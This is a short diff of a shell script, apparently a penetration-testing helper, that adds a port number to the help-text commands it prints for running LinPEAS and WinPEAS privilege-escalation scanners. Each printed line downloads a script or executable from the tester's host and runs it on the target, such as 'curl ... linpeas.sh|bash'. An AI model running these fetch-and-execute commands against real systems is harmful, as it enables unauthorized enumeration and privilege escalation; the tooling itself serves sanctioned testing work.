@@ -44,10 +44,10 @@ if [ "$1" == "peas" ] && [ "$#" -ge 2 ] && { [ "$2" == "lin" ] || [ "$2" == "win
 
   case "$2" in
     "lin")       echo "  curl -s $(getIP)/linpeas.sh|bash|tee linpeas_\$(whoami).log" ;;
-    "winbat")    echo "  Invoke-WebRequest -OutFile winPEAS.bat -Uri http://$(getIP)/winPEAS.bat; .\winPEAS.bat|tee winpeas.log" ;;
-    "winany")    echo "  Invoke-WebRequest -OutFile winPEASany.exe -Uri http://$(getIP)/winPEASany.exe;.\winPEASany.exe| tee winpeas.log" ;;
-    "win86")     echo "  Invoke-WebRequest -OutFile winPEASx86.exe -Uri http://$(getIP)/winPEASx86.exe;.\winPEASx86.exe| tee winpeas.log" ;;
-    "win64")     echo "  Invoke-WebRequest -OutFile winPEASx64.exe -Uri http://$(getIP)/winPEASx64.exe;.\winPEASx64.exe| tee winpeas.log"  ;;
+    "winbat")    echo "  Invoke-WebRequest -OutFile winPEAS.bat -Uri http://$(getIP):${PORT}/winPEAS.bat; .\winPEAS.bat|tee winpeas.log" ;;
+    "winany")    echo "  Invoke-WebRequest -OutFile winPEASany.exe -Uri http://$(getIP):${PORT}/winPEASany.exe;.\winPEASany.exe| tee winpeas.log" ;;
+    "win86")     echo "  Invoke-WebRequest -OutFile winPEASx86.exe -Uri http://$(getIP):${PORT}/winPEASx86.exe;.\winPEASx86.exe| tee winpeas.log" ;;
+    "win64")     echo "  Invoke-WebRequest -OutFile winPEASx64.exe -Uri http://$(getIP):${PORT}/winPEASx64.exe;.\winPEASx64.exe| tee winpeas.log"  ;;
     *)           echo "${warn} Error parsing PEAS version for help text!"; exit ;;
   esac
 
